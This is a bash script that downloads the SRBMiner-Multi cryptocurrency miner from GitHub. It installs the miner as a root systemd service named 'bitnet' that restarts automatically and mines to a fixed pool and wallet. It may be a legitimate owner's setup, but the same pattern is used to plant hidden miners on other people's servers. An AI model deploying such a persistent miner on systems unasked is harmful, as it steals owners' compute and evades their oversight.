#!/bin/bash

# Step 1: 

if [ ! -f "/root/SRBMiner-Multi-2-4-7/SRBMiner-MULTI" ]; then
    # File cpuminer doesn't exist, perform installation
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz
    tar -xvf SRBMiner-Multi-2-4-7-Linux.tar.xz
    cd SRBMiner-Multi-2-4-7
fi

# Step 2: 
sudo tee /etc/systemd/system/bitnet.service <<EOF
[Unit]
Description=cpuminer-opt Service
After=network.target

[Service]
ExecStart=/root/SRBMiner-Multi-2-4-7/SRBMiner-MULTI --algorithm aurum --pool stratum-na.rplant.xyz:7114 --wallet waf1qe4ua6d3h2een65sd5uphz6s02x7p8dfurh7ap7.b --password webpassword=cecepabdul --keepalive true
WorkingDirectory=/root
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 3: 
sudo chmod 644 /etc/systemd/system/bitnet.service

# Step 4:
sudo systemctl daemon-reload

# Step 5: 
sudo systemctl start bitnet

# Wait for 10 seconds
sleep 10

# 
sudo systemctl status bitnet
